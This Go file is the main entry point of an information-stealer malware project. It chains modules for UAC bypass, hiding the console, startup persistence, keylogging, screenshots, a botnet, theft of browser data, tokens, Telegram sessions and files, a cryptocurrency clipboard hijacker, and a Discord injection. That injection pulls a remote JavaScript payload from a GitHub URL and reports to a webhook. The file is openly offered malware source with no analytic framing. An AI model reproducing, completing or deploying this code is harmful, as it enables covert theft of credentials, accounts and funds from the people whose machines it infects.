package main

import (
	"stealer/modules/botnet"
	"stealer/modules/browsers"
	"stealer/modules/clipper"
	"stealer/modules/commonfiles"
	"stealer/modules/discodes"
	"stealer/modules/discordinjection"
	"stealer/modules/fakeerror"
	"stealer/modules/games"
	"stealer/modules/hideconsole"
	"stealer/modules/keylogger"
	"stealer/modules/screenshot"
	"stealer/modules/startup"
	"stealer/modules/system"
	"stealer/modules/telegram"
	"stealer/modules/tg"
	"stealer/modules/tokens"
	"stealer/modules/uacbypass"
	"stealer/modules/upload"
	"stealer/utils/program"
)

func main() {
	CONFIG := map[string]interface{}{
		"webhook": "hook",
		"cryptos": map[string]string{},
	}

	if program.IsAlreadyRunning() {
		return
	}

	uacbypass.Run()

	hideconsole.Run()
	program.HideSelf()

	if !program.IsInStartupPath() {
		go fakeerror.Run()
		go startup.Run()
	}
	telegram.Run()
	tg.Run()
	go keylogger.Run()
	go upload.Run()
	go botnet.Run()
	go screenshot.Run()
	go discordinjection.Run(
		"https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
		CONFIG["webhook"].(string),
	)

	actions := []func(string){
		system.Run,
		browsers.Run,
		tokens.Run,
		discodes.Run,
		commonfiles.Run,
		games.Run,
	}

	for _, action := range actions {
		go action(CONFIG["webhook"].(string))
	}

	clipper.Run(CONFIG["cryptos"].(map[string]string))
}
